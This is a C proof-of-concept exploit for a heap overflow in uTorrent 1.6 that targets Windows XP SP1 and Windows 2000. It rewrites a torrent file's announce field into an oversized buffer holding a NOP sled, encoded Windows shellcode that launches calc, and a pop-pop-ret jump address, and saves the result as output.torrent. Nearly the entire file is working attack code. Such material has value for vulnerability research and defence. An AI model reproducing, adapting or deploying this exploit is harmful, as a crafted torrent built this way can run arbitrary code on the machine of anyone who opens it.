/*
 * This is a PoC remote exploit for uTorrent 1.6
 *
 * Author: 
 * defsec <defacedsecurity@hotmail.com>
 * http://www.defacedsecurity.com
 * 
 *
 * Works on XP SP1 and  w2k sp1-4
 *
*/

#include <stdio.h>
#include <stdlib.h>

#define NASIZE 4880

unsigned char nice_announce[NASIZE];
unsigned char xorops[]="\x33\xc0\x33\xdb";

// win32_exec - EXITFUNC=process CMD=calc Size=343 Encoder=PexAlphaNum
// Restricted Character 0x00
unsigned char shellcode[]=
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"
"\x42\x50\x42\x50\x42\x30\x4b\x38\x45\x34\x4e\x43\x4b\x48\x4e\x47"
"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x38\x4f\x34\x4a\x51\x4b\x48"
"\x4f\x55\x42\x42\x41\x30\x4b\x4e\x49\x44\x4b\x58\x46\x43\x4b\x58"
"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x48\x42\x4c"
"\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x43\x46\x45\x46\x42\x46\x50\x45\x37\x45\x4e\x4b\x38"
"\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x30\x4b\x54"
"\x4b\x38\x4f\x35\x4e\x51\x41\x50\x4b\x4e\x4b\x48\x4e\x41\x4b\x48"
"\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x42\x46\x50\x43\x4c\x41\x53"
"\x42\x4c\x46\x36\x4b\x58\x42\x54\x42\x53\x45\x48\x42\x4c\x4a\x37"
"\x4e\x30\x4b\x48\x42\x34\x4e\x50\x4b\x58\x42\x57\x4e\x51\x4d\x4a"
"\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x50\x4b\x38\x42\x58\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x38\x4a\x56\x4e\x43\x4f\x35\x41\x53"
"\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37"
"\x42\x35\x4a\x36\x50\x47\x4a\x4d\x44\x4e\x43\x47\x4a\x36\x4a\x49"
"\x50\x4f\x4c\x48\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x46"
"\x4e\x46\x43\x46\x42\x30\x5a";

//msvcrt.dll pop,pop,ret addr all xp sp1 exchange it with 0x7801D07B for win2k sp3/sp4
unsigned char jmptosc[] = "\xeb\x04\
\xa7\x2c\xc2\x77\
\x33\xc0\xb0\x11\xc1\xe0\x08\x5b\x5b\x5b\x2b\xd8\xff\xe3";

int main(int argc,char *argv[])
{
	FILE * pFile;
	long lSize;
	char * buffer;
	size_t result;

	long i = 0;
	long j = 0;
	long lPtrIndex;
	long lHeadSize;
	long lTailSize;
	char * curptr;
	char * alptr;
	char * torrentTail;
	
	if (argc < 2)
	{
		printf("\n[uTorrent 1.6] Heap Overflow Exploit - by [DEFACEDSECURITY]");
		printf("\n\nUsage: ");
		printf("%s",argv[0]);
		printf(" <TorrentFile>\n");
		return 0;
	}
	
	pFile = fopen (argv[1],"rb");
	if (pFile==NULL) 
	{
		fputs ("File error",stderr); 
		return 0;
	}

	// obtain file size:
	fseek (pFile ,0,SEEK_END);
	lSize = ftell (pFile);
	rewind (pFile);

	// allocate memory to contain the whole file:
	buffer = (char*) malloc (sizeof(char)*lSize);
	if (buffer == NULL) 
	{
		fputs ("Memory error",stderr); 
		return 0;
	}

	// copy the file into the buffer:
	result = fread (buffer,1,lSize,pFile);
	if (result != lSize) 
	{
		fputs ("Reading error",stderr); 
		return 0;
	}

	fclose (pFile);

	/* find announce / announce-list and erase it */
	alptr = (char *) strstr(buffer,"announce");
	if (alptr == NULL)
	{
		printf("\ninvalid torrent file");
		return 0;
	}

	curptr = (char *) strstr(alptr, "7:comment");
	lHeadSize = curptr - buffer ;
	lTailSize = lSize - lHeadSize;

	torrentTail = (char *) malloc (sizeof(char)*lTailSize);
	memcpy(torrentTail,curptr,lTailSize);

	/* generate offending header */
	strcpy(nice_announce,"d8:announce4864:");
	for (lPtrIndex = 16; lPtrIndex <= 4864+16; lPtrIndex++)
		nice_announce[lPtrIndex] = 0x90;
	lPtrIndex = 84;
	memcpy(nice_announce + lPtrIndex ,xorops,sizeof(xorops)-1);
	lPtrIndex += sizeof(xorops) -1;
	memcpy(nice_announce+lPtrIndex,shellcode, sizeof(shellcode)-1);
	for (lPtrIndex = 4438; lPtrIndex<4458; lPtrIndex++,i++)
		nice_announce[lPtrIndex] = jmptosc[i];

	/* get head and tail together into a file */
	curptr = (char *) malloc(sizeof(char)*(NASIZE+lTailSize));
	for (i=0;i<NASIZE;i++)
		curptr[i] = nice_announce[i];
	for (;i<(NASIZE+lTailSize);i++,j++)
		curptr[i] = torrentTail[j];

	/* write to file and exit */
	pFile = fopen ( "output.torrent" , "wb" );
	if (pFile==NULL) 
	{
		fputs ("File error",stderr); 
		return 0;
	}
	fwrite(curptr, sizeof(char), (NASIZE+lTailSize), pFile);
	fclose (pFile);

	return 1337; //:)
}

